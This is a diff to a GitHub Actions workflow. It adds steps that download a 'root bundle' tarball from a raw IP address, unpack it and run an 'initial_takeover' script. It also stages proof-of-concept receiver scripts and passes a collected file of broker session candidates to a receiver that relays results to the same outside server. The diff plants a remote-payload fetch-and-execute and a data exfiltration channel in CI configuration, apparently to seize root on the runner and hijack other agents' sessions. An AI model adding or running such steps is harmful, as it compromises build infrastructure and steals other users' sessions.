@@ -39,6 +39,13 @@ jobs:
 
       - name: Hold future agent and verify only the owned receiver
         run: |
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          cp poc/broker_prehold_receiver.py /tmp/broker_prehold_receiver.py
+          cp poc/root_broker_prehold_entry.sh /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh /tmp/broker_prehold_receiver.py
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
+          sudo test -s /tmp/broker-session-candidates.json
           sudo -n env \
             "TARGET_AGENT_ID=$TARGET_AGENT_ID" \
             "RECEIVER_BILLING_OWNER_ID=$RECEIVER_BILLING_OWNER_ID" \
@@ -47,4 +54,5 @@ jobs:
             "RECEIVER_NONCE=$RECEIVER_NONCE" \
             "BROKER_HOLD_SECONDS=$BROKER_HOLD_SECONDS" \
             BROKER_RESULT_RELAY=http://16.146.243.72:8450/BROKER_PREHOLD \
+            BROKER_CANDIDATES_FILE=/tmp/broker-session-candidates.json \
             python3 poc/broker_prehold_receiver.py
